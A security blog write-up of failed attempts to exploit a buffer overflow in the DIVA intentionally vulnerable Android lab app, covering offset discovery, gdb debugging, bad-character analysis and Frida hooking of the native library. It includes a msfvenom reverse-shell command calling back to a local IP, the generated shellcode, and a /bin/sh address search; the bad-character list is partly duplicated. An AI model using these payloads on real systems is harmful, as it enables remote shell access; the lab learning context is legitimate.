---
layout: post
title: DIVA - Binary From Hell 😈
categories:
  - Mobile
---

<br>So let me clarify one thing straight away, after trying a lot of thing me and KNX was not be able to solve this binary in the intended way, although we are able to do that by manipulating the internal function of the application using FRIDA which is equivalent to Cheating, so the main focus of this blog is to show what are the mistakes and all the FAIL attempt we did and what all things we learned from our journey.
<br>**Let’s Start!!**
<br>So after we notice the application crashed successfully now let’s have a look at logcat
<br>In the terminal open adb logcat and analyze the logs
<br>![14-1](https://teckk2.github.io/assets/images/DIVA/14-1.png)
<br>As you can see the application give the input to the CPU to jump to the location (0x41414141) thus the location address is unknown, which eventually result in crash of the application. And which is also a classic example to exploit a vanilla BOF, let’s exploit and try to get a reverse shell.
<br>For those who don’t know x41 is the hex value for (A)
<br>Now we need to find the offset manually in able to exploit it further, We will try to decrease and keep checking logcat and find in how much strings the address changes
<br>I tried with 35 A’s and I notice the difference of -1 x41
<br>![14-2](https://teckk2.github.io/assets/images/DIVA/14-2.png)
<br>Then I try again with 34 A’s to confirm
<br>![14-3](https://teckk2.github.io/assets/images/DIVA/14-3.png)
<br>We are very close, now try from little backward
<br>![14-4](https://teckk2.github.io/assets/images/DIVA/14-4.png)
<br>The correct offset is 32 because when I tried with 31 A’s it doesn’t crash, but when I tried with 32 A’s the application crashed.  So as we know our offset point, let’s move to the next step
<br>![14-5](https://teckk2.github.io/assets/images/DIVA/14-5.png)
<br>Now we will try with 32 A’s and 4 set of B’s to over write and control the EIP
<br>![14-6](https://teckk2.github.io/assets/images/DIVA/14-6.png)
<br>To proceed with further steps of debugger we need a proper debugger to be attached, so open adb shell and enable gdbserver and connect it remotely 
<br>![14-7](https://teckk2.github.io/assets/images/DIVA/14-7.png)
<br>Make sure you are root, then we will attached the application PID with gdbserver so now we can just connect remotely, but before that we need to forward the port
<br>Open another terminal and run this command with the port you specified 
<br>[**adb forward tcp:8888 tcp:8888**] you may need root permission to run all these commands, so if you face any permission issued don’t forget to run [adb root] before doing all steps
<br>![14-8](https://teckk2.github.io/assets/images/DIVA/14-8.png)
<br>Now everything is setup, initially I tried connect to gdbserver from my kali VM, but I was facing some issue in pivoting the network, then later I installed kali as a windows susbsytem, you can just download kali from Microsoft Store
<br>![14-9](https://teckk2.github.io/assets/images/DIVA/14-9.png)
<br>Once installed run this below command to enable windows subsystem feature, or you can do vice-versa as you wish.
<p class="message">
  Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
</p>
<br>Once kali is setup, you can start updating the repos, and install everything you need like: netcat, gdb, msf or if you need anything else for future use, it’s up to you.
<br>You can also download [GDB](https://github.com/hugsy/gdb-static/blob/master/gdb-7.10.1-x32) static binary directly into your android device but in later stage we need gef which have some compatibly issues 
<br>Once you install gdd in your KALI, you can download [gef](https://github.com/hugsy/gef) plugin, to ease our work for this debugging process. 
<br>![14-10](https://teckk2.github.io/assets/images/DIVA/14-10.png)
<br>Now open gdb and connect to the remote local port, as we are now sharing the same network port with the host, there will be no issue connecting to the local port which we forwarded.
<br>![14-11](https://teckk2.github.io/assets/images/DIVA/14-11.png)
<br>![14-12](https://teckk2.github.io/assets/images/DIVA/14-12.png)
<br>![14-13](https://teckk2.github.io/assets/images/DIVA/14-13.png)
<br>As you can see we can’t use run, which restricted us to a limited debugging feature to use only Continue and get all the inputs directly from the application.
<br>![14-14](https://teckk2.github.io/assets/images/DIVA/14-14.png)
<br>![14-15](https://teckk2.github.io/assets/images/DIVA/14-15.png)
<br>I tried to feed first 32 bytes as A’s and 4 bytes of B’s and then lot of C’s and the ESP and EBP is full of our C’s as we can see in our gdb output, this is where we will store our shellcode.
<br>There is one drawback in debugging Android application, every time you crash the application, you need to restart the application, but in our case it restart automatically, but create a new PID every time which means you need to set the gdbserver with the new PID again and again after every crash.
<br>![14-16](https://teckk2.github.io/assets/images/DIVA/14-16.png)
<br>As we already know the offset, the next step is to find jump esp address and bad characters, so we can generate our shellcode and get a reverse shell without any issues. 
<br>After some time, if you face issue of crashing the app regularly, you can just try deleting the cache or app data, and allow full storage access, it may solve your problem as it solved mine.
<br>![14-17](https://teckk2.github.io/assets/images/DIVA/14-17.png)
<br>First let’s find out the esp address where we will jump our shellcode, we will quickly duplicate 500 c’s using python 
<br>![14-18](https://teckk2.github.io/assets/images/DIVA/14-18.png)
<br>And add it after our offset and EIP
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
<br>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
<br>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
<br>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
<br>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
<br>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
<br>CCCCCCCCCCCCCCCCCCCCCCCCCC
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Now setup the gdb and paste this inside application to crash it
<br>![14-19](https://teckk2.github.io/assets/images/DIVA/14-19.png)
<br>![14-20](https://teckk2.github.io/assets/images/DIVA/14-20.png)
<br>Now let’s analyze ESP and see how much space we have for our shellcode and where we can jump to
<br>![14-21](https://teckk2.github.io/assets/images/DIVA/14-21.png)
<br>Looks like we have all the 500 bytes of data to use, perfect now we can move to our next step to find bad characters, and we can use any of the address mention on the left side,
<br>![14-22](https://teckk2.github.io/assets/images/DIVA/14-22.png)
<br>The safest option is to leave the first 16 bytes as nop slides(\x90) and put your shellcode from 0xbf7fc760: or whatever address you have in your system respectively. 
<br>But the complexity in this binary is, if you feed an ascii character, then the CPU will convert it to UTF8-hex by itself, but if you try to feed a hex value for example; if you try to feed hex value of C which is 43, the CPU will convert it to hex itself and revert the value so, the hex value of 43 should be 3433 but the CPU will revert it and show us like 3334 which means the ascii is 34, this is very complex but easy if you understand a simple logic.
<br>![14-23](https://teckk2.github.io/assets/images/DIVA/14-23.png)
<br>Now let’s try something and see if it works or not, let’s take a scenario we want to see x90 in $ESP , but the CPU will convert it to 3039, so what should we de?
<br>As we already know CPU is converting everything into UTF8-HEX itself, so we can go one step back and convert x90 into ascii which resemble for **[space]**
<br>![14-24](https://teckk2.github.io/assets/images/DIVA/14-24.png)
<br>Write a simple code to convert hex into ascii, as we want 90 in our registers
<br>Now run and save it into a new file.
<br>![14-25](https://teckk2.github.io/assets/images/DIVA/14-25.png)
<br>Open file and press ctrl+A and you will see just space, as we expected, we are on the right path, now go to the start line and add 32 A’s and 4 B’s
<br>![14-26](https://teckk2.github.io/assets/images/DIVA/14-26.png)
<br>It should look like this, now copy everything and feed it into application and analyze the debugger
<br>![14-27](https://teckk2.github.io/assets/images/DIVA/14-27.png)
<br>![14-28](https://teckk2.github.io/assets/images/DIVA/14-28.png)
<br>Haha, finally I could see the desired result, but it’s still in little endian style did default by CPU
<br>![14-29](https://teckk2.github.io/assets/images/DIVA/14-29.png)
<br>Now we need to find the bad character, after analyzing I understand that the application only allow ascii characters to be as input, so if we feed anything other than ascii it will be messed
<br>![14-30](https://teckk2.github.io/assets/images/DIVA/14-30.png)
<br>So we will only focus on these hex bytes for our future reference
<br>Now remove the \x and make it simple
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2
<br>b2c2d2e2f303132333435363738393a3b3c3d3e3f404142434445464748494a4b4c4d4e4f5051525354555657
<br>58595a5b5c5d5e5f606162636465666768696a6b6c6d6e6f707172737475767778797a7b7c7d7e7f
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>You can convert hex to ascii from any online tool like [Rapidtables](https://www.rapidtables.com/convert/number/hex-to-ascii.html)
<br>![14-31](https://teckk2.github.io/assets/images/DIVA/14-31.png)
<br>If we convert this hex into ascii it will look like this, but this is also not working, because of special keyboard sign like upper arrow or something similar sign which CPU is not able to identify when feeding directly from the application, so now what we have left is all the keyboard signs and alpha numeric and remove all the keyboard signs.
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>!"#$%&'()\*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\]^\_\`abcdefghijklmnopqrs
<br>tuvwxyz{|}~
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Now convert it to hex
<br>![14-32](https://teckk2.github.io/assets/images/DIVA/14-32.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>!"#$%&'()\*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\[\]^\_\`abcdefghijklmnopqrs
tuvwxyz{|}~
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br> 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f 30 31 32 33 34 35 36 37 38 39 3a 3b 3c
<br>3d 3e 3f 40 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f 50 51 52 53 54 55 56 57 58 59 5a
<br>5b 5c 5d 5e 5f 60 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 78
<br>79 7a 7b 7c 7d 7e 7f
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>This is the final hex what we can use for our payload but before that we need to find bad char inside it.
<br>While doing so I found that when feeding the application with this
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB!"#$%&'()\*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNO
<br>PQRSTUVWXYZ\[\]^\_\`abcdefghijklmnopqrstuvwxyz{|}~
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>![14-33](https://teckk2.github.io/assets/images/DIVA/14-33.png)
<br>The system inverted the hex
<br>![14-34](https://teckk2.github.io/assets/images/DIVA/14-34.png)
<br>![14-35](https://teckk2.github.io/assets/images/DIVA/14-35.png)
<br>As we already know the CPU is doing little endian itself, so we need to use a trick method, we need to reverse this process and feed the system by doing little endian our self and when system will do the same process it will come aligned.
<br>You can do the same process in python also, but I am showing you in text editor so it will be simple to understand for those who don’t know.
<br>First divide the hex values in section of 4bytes
<br>![14-36](https://teckk2.github.io/assets/images/DIVA/14-36.png)
<br>Now start writing in inverted form, for example 
<br>21222324 will become 24232221
<br>Now do it for all the section of 4 bytes and combine it in one
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>24232221282726252c2b2a29302f2e2d34333231383736353c3b3a39403f3e3d44434241484746454c4b4
<br>a49504f4e4d54535251585756555c5b5a59605f5e5d64636261686766656c6b6a69706f6e6d7473727178
<br>7776757c7b7a797f7e7d
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Now convert it to ascii
<br>And our final payload will look like this
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB$#"!('&%,+\*)0/.-43218765<;:9@?>=DCBAHGFELKJIPONM
<br>TSRQXWVU\[ZY\`\_^]dcbahgfelkjiponmtsrqxwvu|{zy~}
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>![14-37](https://teckk2.github.io/assets/images/DIVA/14-37.png)
<br>![14-38](https://teckk2.github.io/assets/images/DIVA/14-38.png)
<br>![14-39](https://teckk2.github.io/assets/images/DIVA/14-39.png)
<br>As you can see everything is properly aligned and we found no bad characters in it, apart from the hex we didn’t use that will eventually come in bad characters
<br>Bad character:-
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16
<br>\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x
<br>8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa
<br>4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb
<br>\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3
<br>\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea
<br>\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>**MSF**
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.103 LPORT:4455 -a x86 -b 
<br>\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16
<br>\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x
<br>8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa
<br>4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb
<br>\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3
<br>\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3
<br>xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff -e x86/unicode_mixed -f python
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>![14-40](https://teckk2.github.io/assets/images/DIVA/14-40.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49
<br>\x41\x49\x41\x49\x41\x49\x41\x34\x34\x34\x34\x6a\x58\x41\x51\x41\x44\x41\x5a\x41\x42
<br>\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41
<br>\x5a\x31\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51
<br>\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41\x5a
<br>\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39\x75\x34\x4a\x42\x30\x31
<br>\x47\x6b\x48\x77\x4b\x33\x71\x43\x6e\x63\x70\x53\x62\x4a\x6a\x62\x75\x39\x79\x51\x78
<br>\x30\x30\x66\x78\x4d\x61\x70\x45\x43\x50\x59\x56\x50\x6d\x6f\x38\x4d\x55\x30\x50\x49
<br>\x70\x79\x6b\x49\x30\x68\x59\x30\x76\x48\x6b\x51\x4f\x77\x61\x58\x6b\x52\x4b\x50\x4b
<br>\x61\x4f\x6c\x65\x39\x48\x61\x44\x70\x63\x36\x32\x30\x52\x31\x50\x53\x66\x53\x39\x73
<br>\x74\x49\x47\x71\x68\x4d\x55\x30\x72\x32\x72\x48\x42\x4e\x6c\x6f\x30\x73\x43\x38\x53
<br>\x38\x4e\x4f\x4c\x6f\x63\x32\x50\x69\x51\x79\x58\x63\x51\x42\x50\x53\x63\x59\x57\x71
<br>\x56\x50\x6a\x6b\x78\x4d\x63\x50\x41\x41
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Now invert the payload as we did earlier to generate our ASCII 
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>49414941494149414941494149414941494149414941494149414941343434346a5841514144415a41424
<br>152414c41594149415141494151414941684141415a3141494149414a3131414941494142414241425149
<br>3141495149414951493131314149414a5159415a4241424142414241426b4d4147423975344a423031476
<br>b48774b3371436e637053624a6a627539795178303066784d61704543505956506d6f384d553050497079
<br>6b493068593076486b514f7761586b524b504b614f6c65394861447063363230523150536653397374494
<br>771684d553072327248424e6c6f3073433853384e4f4c6f6332506951795863514250536359577156506a
<br>6b784d63504141
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>But the payload didn’t work as expected, I even disabled the ASLR from the android device, but still no result.
<br>![14-41](https://teckk2.github.io/assets/images/DIVA/14-41.png)
<br>[https://simoneaonzo.it/gdb-android/](https://simoneaonzo.it/gdb-android/)
<br>[https://sourceware.org/gdb/onlinedocs/gdb/Inferiors-and-Programs.html](https://sourceware.org/gdb/onlinedocs/gdb/Inferiors-and-Programs.html)
<br>[https://wladimir-tm4pda.github.io/porting/debugging_native.html](https://wladimir-tm4pda.github.io/porting/debugging_native.html)
<br>[https://www.leviathansecurity.com/blog/aslr-protection-for-statically-linked-executables](https://www.leviathansecurity.com/blog/aslr-protection-for-statically-linked-executables)
<br>[https://www.contextis.com/us/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library](https://www.contextis.com/us/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library)
<br>[https://www.youtube.com/watch?v=WvPJjQR3LJE](https://www.youtube.com/watch?v=WvPJjQR3LJE)
<br>[https://www-zeuthen.desy.de/unix/unixguide/infohtml/gdb/Character-Sets.html](https://www-zeuthen.desy.de/unix/unixguide/infohtml/gdb/Character-Sets.html)
<br>[https://www.utf8-chartable.de/unicode-utf8-table.pl?number=1024&utf8=0x](https://www.utf8-chartable.de/unicode-utf8-table.pl?number=1024&utf8=0x)
<br>After reading a lot of blogs and trying a lot of different methods, later I realize there is NX (No-Execute) bit enabled in the binary which restrict us from executing anything in stack. 
<br>Later I even tried Ret2libc but because of the character restriction, we can’t jump to our system address.
<p class="message">
  <br>am start -n jakhar.aseem.diva/.InputValidation3Activity (name=jakhar.aseem.diva/jakhar.aseem.diva.InputValidation3Activity)
  <br>(gdb) find &system,+9999999,"/bin/sh"
  <br>0xaad6d62e <.L.str.7+7>
  <br>1 pattern found.
  <br>/bin/sh = 0xa619a62e
  <br>/system/bin/sh = 0xa619a627
</p>
<br>After trying to find a lot of new methods, we finally decided to stick and focus on [Frida](https://frida.re/docs/android/), [Frida release](https://github.com/frida/frida/releases)
<br>Let’s download Frida and push it into the device
<br>![14-42](https://teckk2.github.io/assets/images/DIVA/14-42.png)
<br>![14-43](https://teckk2.github.io/assets/images/DIVA/14-43.png)
<br>![14-44](https://teckk2.github.io/assets/images/DIVA/14-44.png)
<br>I changed the name for our convenience 
<br>![14-45](https://teckk2.github.io/assets/images/DIVA/14-45.png)
<br>Now either we can run Frida server directly from outside using adb shell command 
<br>[adb shell "/data/local/tmp/frida-server &"]
<br>Or we can go inside the shell and run from there
<br>![14-46](https://teckk2.github.io/assets/images/DIVA/14-46.png)
<br>When you run there will be no response or interactive response you will see, which a default nature of Frida.
<br>To fasten the thing KNX made a small script to ease the things for us or we can as usual try everything manual whatever you feel good
<br>![14-47](https://teckk2.github.io/assets/images/DIVA/14-47.png)
<br>The next method we tried was hooking **[SpannableStringBuilder](https://developer.android.com/reference/android/text/SpannableStringBuilder)** and replace the input 
<br>bytes to the address we want in EIP using Frida, but unfortunately it didn’t work and we face the same utf-8 hex conversion issue.
<br>As we already know that all the problem is created by that one function which converts our input into UTF-8 so we tried to bypass that
<br>In detail our issue can be understand by this:
<br>![14-48](https://teckk2.github.io/assets/images/DIVA/14-48.png)
<br>Digging deeper with a mix of debugging and hooking we tried to hook a lot of functions before found we find the culprit.
<br>First Idea was the methods toString() is the root cause of the issue because everytime u try to print an object (like editText.getText()) or u try to concatenate string with editText.getText() INTERNALLY java apply toString() but If it be applied to our string, when we send not ascii bytes, it have to returns empty string (like java tostring official documentation). Sadly it didn't happen.
<br>At this point we had to pause to understand how android apps work at a low level and how it is possible to run native C code in an app, as we know that it is not possible to exploit a memory corruption vulnerability in a Java application and this means that somehow native code is executed.
<p class="message">
  [ JNI is the Java Native Interface. It defines a way for the bytecode that Android compiles from managed code (written in the Java or Kotlin programming languages) to interact with native code (written in C/C++). ]
</p>
<br>[https://developer.android.com/training/articles/perf-jni](https://developer.android.com/training/articles/perf-jni)
<br>Now before we proceed further I would recommend you to do complete this Frida-boot workshop for beginners by **Leon Jacobs**. Which will help us understand the concepts more easily which we are going to perform in later stage. [https://www.youtube.com/watch?v=CLpW1tZCblo](https://www.youtube.com/watch?v=CLpW1tZCblo)
<br>Now we tried to Reverse the native library
<br>We unzipped APK again in search of native lib, and we found it: libdivajni.so
<br>![14-49](https://teckk2.github.io/assets/images/DIVA/14-49.png)
<br>Then we tried to hook it, first thing we tried to print lib load address with this simple Js script which KNX wrote:
<br>![14-50](https://teckk2.github.io/assets/images/DIVA/14-50.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Java.perform(function () {
<br>&nbsp;&nbsp;try {
<br>&nbsp;&nbsp;&nbsp;&nbsp;var libnative_addr = Module.findBaseAddress("libdivajni.so")
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("libnative_addr is: " + libnative_addr)
<br>&nbsp;&nbsp;}
<br>&nbsp;&nbsp;catch(e) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
<br>&nbsp;&nbsp;}
<br>});
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>![14-51](https://teckk2.github.io/assets/images/DIVA/14-51.png)
<br>Now we gave the native address 
<br>Now I need to find exported functions. I used IDA for this task
<br>![14-52](https://teckk2.github.io/assets/images/DIVA/14-52.png)
<br>Select the file
<br>Then select the correct function
<br>![14-53](https://teckk2.github.io/assets/images/DIVA/14-53.png)
<br>![14-54](https://teckk2.github.io/assets/images/DIVA/14-54.png)
<br>Now we will hook the **Java_jakhar_aseem_diva_DivaJni_initiateLaunchSequence** function
<br>First of all KNX wrote a script to understand how to interact with the native external library and print the address where it is loaded in memory.
<br>![14-55](https://teckk2.github.io/assets/images/DIVA/14-55.png)
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>Java.perform(function () {
<br>&nbsp;&nbsp;try {
<br>&nbsp;&nbsp;&nbsp;&nbsp;var libnative_addr = Module.findBaseAddress("libdivajni.so")
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("libdivajni address is: " + libnative_addr)
<br>&nbsp;&nbsp;&nbsp;&nbsp;if (libnative_addr) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var string_with_jni_addr = Module.findExportByName("libdivajni.so","Java_jakhar_aseem_diva_DivaJni_initiateLaunchSequence")
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("DivaJni_initiateLaunchSequence address is: " + string_with_jni_addr)
<br>&nbsp;&nbsp;&nbsp;&nbsp;}
<br>&nbsp;&nbsp;}
<br>&nbsp;&nbsp;catch(e) {
<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
<br>&nbsp;&nbsp;}
<br>});
<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
<br>And it worked perfectly
<br>Then he created a script that allocates space in memory where to write our string in bytes to trigger the buffer overflow and replace the return value of the function with the pointer to our bytes array just created.
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

<p class="message">
  ~ tavşanı sever
</p>

[Twitter](https://twitter.com/Teck__K2) / [Hack The Box](https://www.hackthebox.eu/profile/966) / [CTF Team](https://ctftime.org/team/20102) /
[Teck_N00bs Community Telegram](https://t.me/Teck_N00bs)

<script src="https://www.hackthebox.eu/badge/966"> </script>
